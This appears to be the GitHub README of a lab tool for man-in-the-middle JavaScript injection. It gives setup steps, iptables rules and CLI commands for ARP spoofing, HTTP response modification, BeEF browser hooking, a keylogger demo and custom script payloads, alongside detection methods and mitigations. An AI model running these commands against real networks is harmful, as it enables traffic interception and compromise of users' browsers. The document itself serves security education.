# XSS Code Injection - Ethical Hacking Project

A portfolio-grade security research tool demonstrating MITM JavaScript injection attacks in controlled lab environments. This tool is designed for educational purposes only, with mandatory safety controls and defensive framing.

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR EDUCATIONAL AND LAB USE ONLY.**

- Unauthorized use is illegal and unethical
- Requires explicit written authorization from network owners
- Use only in isolated lab environments
- Target only systems you own or have permission to test
- Comply with all applicable laws and regulations

By using this tool, you acknowledge:
- You have written authorization for all targets
- You accept full legal responsibility for your actions
- This is for lab/educational purposes only

## 🎯 What This Tool Demonstrates

This project demonstrates a complete MITM (Man-in-the-Middle) JavaScript injection attack chain:

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attack Chain Overview                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ARP Spoofing                                                 │
│     ├─ Position attacker as MITM                                │
│     └─ Intercept traffic between victim and gateway              │
│                                                                 │
│  2. NFQUEUE Interception                                        │
│     ├─ Use NetfilterQueue to capture packets                     │
│     └─ Forward to userspace for processing                      │
│                                                                 │
│  3. HTTP Response Modification                                   │
│     ├─ Strip Accept-Encoding to defeat gzip compression         │
│     ├─ Parse HTTP headers and body                               │
│     └─ Handle chunked transfer encoding                          │
│                                                                 │
│  4. JavaScript Injection                                         │
│     ├─ Inject payload before </body> tag                        │
│     ├─ Recalculate Content-Length header                        │
│     └─ Support multiple injection strategies                     │
│                                                                 │
│  5. BeEF Hook Integration                                        │
│     ├─ Monitor BeEF REST API for hooked browsers                │
│     ├─ Detect successful hooks in real-time                      │
│     └─ Close the loop between injection and exploitation         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🏗️ Architecture

```
xss-code-injection/
├── src/
│   ├── config/              # Configuration and safety controls
│   │   ├── safety.py       # Authorization, RFC1918 validation
│   │   └── settings.py     # YAML configuration management
│   ├── injectors/          # Pluggable injection strategies
│   │   ├── base.py         # Base injector class
│   │   ├── eicar.py        # EICAR test string (default)
│   │   ├── beef.py         # BeEF hook injector
│   │   ├── alert.py       # Alert test injector
│   │   ├── keylogger.py   # Keylogger demo (lab-only)
│   │   └── custom.py       # Custom JS file injector
│   ├── interceptor/       # Network packet interception
│   │   ├── packet_handler.py   # HTTP parsing and modification
│   │   └── nfqueue_loop.py     # NFQUEUE management
│   ├── mitm/              # MITM positioning
│   │   ├── arp_spoofer.py      # ARP spoofing with cleanup
│   │   ├── iptables_manager.py # iptables rule install/remove
│   │   └── shutdown.py         # Unified cleanup coordinator
│   ├── beef_integration.py # BeEF REST API integration
│   ├── auto_hook.py       # Auto-discovery and hook automation
│   ├── cli.py             # Command-line interface
│   ├── logging_config.py  # Structured logging
│   └── stats_dashboard.py # Real-time statistics
├── tests/                 # Unit tests
├── detect.py             # Defensive detection companion
├── pyproject.toml        # Project configuration
├── requirements.txt      # Python dependencies
└── Makefile             # Build automation
```

## 🚀 Features

### Core Capabilities
- **HTTP MITM Interception**: Transparent interception via NetfilterQueue
- **Gzip Defeat**: Strips Accept-Encoding to handle uncompressed responses
- **Content-Length Recalculation**: Correctly updates after injection
- **Chunked Encoding Support**: Handles chunked transfer encoding
- **Text/HTML Only**: Injects only into HTML responses

### Safety Controls (Non-Negotiable)
- **Authorization Flag**: Requires `--i-have-authorization` flag
- **Target Allowlist**: Mandatory TARGETS.txt file with victim IPs
- **RFC1918 Gating**: Hard-gated to private IP ranges only
- **Legal Banner**: Prominent disclaimer on startup
- **EICAR Payload**: Default safe payload (antivirus test string)

### Injection Strategies
- **EICAR Test**: Default safe payload (antivirus test string)
- **BeEF Hook**: Integration with Browser Exploitation Framework
- **Alert Test**: Simple JavaScript alert for testing
- **Keylogger Demo**: Benign keystroke logging to console (lab-only)
- **Custom JS**: Load custom JavaScript from file

### Advanced Features
- **BeEF Integration**: REST API monitoring for hooked browsers
- **Auto-Hook Mode**: Automated discovery, spoofing, and monitoring
- **Targeting Rules**: Domain/path whitelisting and blacklisting
- **Injection Throttling**: Prevents repeated injections
- **Session Tracking**: Per-target injection timing
- **Stats Dashboard**: Real-time statistics display

### Defensive Companion
- **ARP Monitoring**: Detect ARP spoofing attempts
- **Content-Length Analysis**: Identify size anomalies
- **Script Detection**: Find unexpected script tags
- **Encoding Monitoring**: Detect Accept-Encoding stripping

## 🛠️ Installation

### Prerequisites
- Linux (tested on Kali Linux, Ubuntu)
- Python 3.8+
- Root/sudo privileges
- NetfilterQueue support
- Scapy

### Setup

```bash
# Clone the repository
git clone https://github.com/dannyj1202/XSS-Code-Injection---Ethical-Hacking-Project.git
cd XSS-Code-Injection---Ethical-Hacking-Project

# Install dependencies
pip install -r requirements.txt

# Install NetfilterQueue (may require system packages)
sudo apt-get install libnfnetlink-dev libnetfilter-queue-dev
pip install NetfilterQueue

# Configure iptables to forward HTTP traffic to NFQUEUE
sudo iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
```

## 📋 Lab Setup Guide

### Environment
- **Attacker**: Kali Linux VM
- **Victim**: Windows/Linux VM on same subnet
- **Gateway**: Router or VM acting as gateway
- **Network**: Isolated lab network (no internet access)

### Network Configuration

```
Attacker (Kali):    192.168.1.100
Victim (Windows):   192.168.1.101
Gateway:            192.168.1.1
Subnet:             192.168.1.0/24
```

### Step-by-Step Setup

1. **Create TARGETS.txt**
```bash
echo "192.168.1.101" > TARGETS.txt
```

2. **Enable IP Forwarding**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

3. **Configure iptables**
```bash
sudo iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

4. **Run the tool**
```bash
sudo python -m src.cli --i-have-authorization --payload eicar --verbose
```

5. **Clean up iptables**
```bash
sudo iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
```

## 💻 Usage Examples

### Basic Interception with EICAR Payload
```bash
sudo python -m src.cli --i-have-authorization --verbose
```

### BeEF Hook Integration
```bash
# Start BeEF server first
cd /path/to/beef
./beef

# Run injection tool with BeEF hook
sudo python -m src.cli \
  --i-have-authorization \
  --payload beef \
  --beef-host 127.0.0.1 \
  --beef-port 3000 \
  --monitor-beef \
  --verbose
```

### Auto-Hook Mode
```bash
sudo python -m src.cli \
  --i-have-authorization \
  --auto-hook \
  --subnet 192.168.1.0/24 \
  --gateway 192.168.1.1 \
  --verbose
```

### Custom JavaScript Payload
```bash
echo 'console.log("Custom payload");' > custom.js
sudo python -m src.cli \
  --i-have-authorization \
  --payload custom \
  --custom-file custom.js \
  --verbose
```

### ARP Spoofing + Injection
```bash
sudo python -m src.cli \
  --i-have-authorization \
  --arp-spoof \
  --gateway 192.168.1.1 \
  --payload beef \
  --verbose
```

## 🛡️ Defensive Analysis

### Why HTTPS/HSTS/CSP Kill This Attack

This attack works only on **unencrypted HTTP**. Modern security controls prevent it:

1. **HTTPS/TLS**: Encrypts all traffic, preventing MITM modification
2. **HSTS**: Forces HTTPS connections, preventing downgrade attacks
3. **CSP**: Content Security Policy blocks unauthorized scripts
4. **Certificate Pinning**: Prevents MITM with fake certificates

### Detection Methods

The included `detect.py` demonstrates blue team detection:

```bash
# Run comprehensive scan
python detect.py --scan

# Monitor ARP table for changes
python detect.py --monitor-arp --interval 5
```

**Detection Indicators:**
- Unexpected ARP table changes (MAC-IP mapping changes)
- Content-Length anomalies in HTTP responses
- Unexpected `<script>` tags in known-clean pages
- Missing or modified Accept-Encoding headers

### Mitigation Strategies

1. **Deploy HTTPS Everywhere**: Use TLS for all web traffic
2. **Implement HSTS**: Force HTTPS connections
3. **Use CSP**: Restrict script sources
4. **Monitor ARP Tables**: Detect spoofing attempts
5. **Network Segmentation**: Isolate critical systems
6. **Port Security**: Implement dynamic ARP inspection

## 🧪 Testing

### Unit Tests
```bash
# Run all tests
pytest tests/

# Run with coverage
pytest tests/ --cov=src --cov-report=html

# Run specific test
pytest tests/test_injection.py -v
```

### Integration Testing
```bash
# Test in isolated lab environment
# Follow lab setup guide above
# Use EICAR payload for safe testing
```

## 📊 Statistics Dashboard

The tool includes a real-time statistics dashboard showing:

- Packets processed
- HTTP responses seen
- Injection attempts/successes
- Per-target status
- Hooked browser count
- Success rate

Dashboard updates automatically during operation.

## 🔧 Configuration

### YAML Configuration (config.yaml)

```yaml
injection:
  enabled: true
  inject_before_body: true
  strip_accept_encoding: true
  only_text_html: true
  chunked_handling: "dechunk"
  domain_whitelist: []
  path_whitelist: []
  domain_blacklist: []
  path_blacklist: []
  reinjection_delay: 5
  throttle_per_target: true

beef:
  enabled: false
  host: "127.0.0.1"
  port: 3000
  api_token: null
  hook_url: null
  auto_detect_hooks: true
  poll_interval: 5

network:
  interface: "eth0"
  queue_num: 0
  gateway: null
  arp_spoof_enabled: false

logging:
  level: "INFO"
  verbose: false
  log_file: null
  log_requests: false
  log_responses: false

stats:
  enabled: true
  update_interval: 1
  dashboard_type: "textual"

targets_file: "TARGETS.txt"
default_payload: "eicar"
custom_payload_file: null
```

## 🤝 Contributing

This is an educational project. Contributions should focus on:
- Improving safety controls
- Adding defensive detection methods
- Enhancing documentation
- Fixing bugs
- Adding tests

## 📝 License

MIT License - See LICENSE file for details

## ⚖️ Ethics and Legal Compliance

This tool is designed for:
- **Security research and education**
- **Understanding web vulnerabilities**
- **Developing defensive strategies**
- **Lab-based testing only**

**NOT for:**
- Unauthorized access to systems
- Malicious activities
- Production environment testing
- Any illegal purposes

## 🙏 Acknowledgments

- **Scapy**: Network packet manipulation
- **NetfilterQueue**: Linux packet filtering
- **BeEF**: Browser Exploitation Framework
- **Security Community**: For research and best practices

## 📚 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CSP Level 3](https://www.w3.org/TR/CSP3/)
- [HSTS Specification](https://tools.ietf.org/html/rfc6797)
- [RFC 1918 - Private Address Space](https://tools.ietf.org/html/rfc1918)

## 🐛 Bug Reporting

Report bugs via GitHub Issues. Include:
- Python version
- OS/distribution
- Steps to reproduce
- Error messages
- Network configuration

## 📧 Contact

For questions about this educational project, please open a GitHub Issue.

---

**Remember**: This tool is for educational purposes only. Always obtain proper authorization before testing.
